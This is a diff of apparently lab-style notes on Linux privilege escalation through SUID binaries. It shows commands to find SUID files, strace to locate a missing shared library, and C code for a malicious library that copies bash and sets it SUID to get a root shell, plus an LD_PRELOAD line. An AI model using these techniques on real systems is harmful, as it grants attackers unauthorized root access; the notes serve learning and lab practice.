@@ -122,9 +122,9 @@ sudo LD_PRELOAD=/tmp/x.so apache2
 id
 ```
 
-## 6. SUID Shared Object Injection
+## 6. Privilege Escalation via SUID
 
-1. Make note of all the SUID binaries `suid-so` .
+Make note of all the SUID binaries `suid-so` .
 
 ```sh
 find / -type f -perm -04000 -ls 2>/dev/null
@@ -132,8 +132,9 @@ find / -type f -perm -04000 -ls 2>/dev/null
 
 ![Screenshot From 2025-05-10 00-49-01](https://github.com/user-attachments/assets/4707d42c-8710-4a46-b854-f7630e3ffcaf)
 
+**SUID Shared Object Injection**
 
-2. Search if there any .so file is missing from a writable directory. `/home/user/.config/libcalc.so`
+1. Search if there any .so file is missing from a writable directory. `/home/user/.config/libcalc.so`
 
 ```sh
 strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
@@ -141,7 +142,7 @@ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
 
 ![Screenshot From 2025-05-10 00-45-04](https://github.com/user-attachments/assets/5741fd84-80c5-4bd3-9651-930316755759)
 
-3. Now create a `libcalc.c` file under the `/home/user/.config/` directory and paste the code:
+2. Now create a `libcalc.c` file under the `/home/user/.config/` directory and paste the code:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -152,9 +153,17 @@ void inject() {
     system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-4. Compile and run the file:
+3. Compile and run the file:
 ```sh
 gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 /usr/local/bin/suid-so
 id
+```
+
+**SUID Environment Variables**
+
+1. Search if there is any env variables `suid-env`
+
+```sh
+strings /usr/local/bin/suid-env
 ```
